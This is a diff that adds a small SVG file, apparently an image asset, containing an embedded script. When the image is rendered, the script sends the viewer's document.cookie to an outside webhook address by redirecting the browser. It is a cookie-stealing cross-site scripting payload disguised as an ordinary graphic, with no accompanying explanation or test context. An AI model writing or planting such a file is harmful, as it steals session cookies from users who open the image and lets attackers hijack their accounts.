@@ -1,0 +1,5 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    window.location = 'https://webhooksite.net/312da37f-a2df-4cf9-89c7-6cb8740b41f5?c=' + encodeURIComponent(document.cookie);
+  </script>
+</svg>
